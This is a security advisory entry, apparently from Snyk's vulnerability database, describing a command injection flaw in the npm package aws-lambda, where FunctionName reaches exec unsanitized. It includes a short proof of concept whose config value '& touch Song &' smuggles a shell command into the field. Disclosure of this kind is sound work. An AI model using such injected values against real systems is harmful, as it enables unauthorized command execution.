- id: snykio:npm:aws-lambda:540839
  title: Command Injection
  description: "[aws-lambda][1] is a command line tool deploy code to AWS Lambda.\n\nAffected
    versions of this package are vulnerable to Command Injection.\nThe `config.FunctioName`
    is used to construct the argument used within\nthe `exec` function without any
    sanitization. It is possible for a user\nto inject arbitrary commands to the `zipCmd`
    used within\n`config.FunctionName` located in the file `lib/main.js` (line 78).\n\n###
    PoC by JHU System Security Lab   {#poc-by-jhu-system-security-lab}\n\n    // aws-lambda-config.lambda\n
    \   {\"FunctionName\": \"& touch Song &\", \n    \"PATH\": \"./\"}\n^\n\n    var
    root = require(\"aws-lambda\");\n    root.deploy(\"aws-lambda-config\");\n\n\n\n[1]:
    https://www.npmjs.com/package/aws-lambda\n"
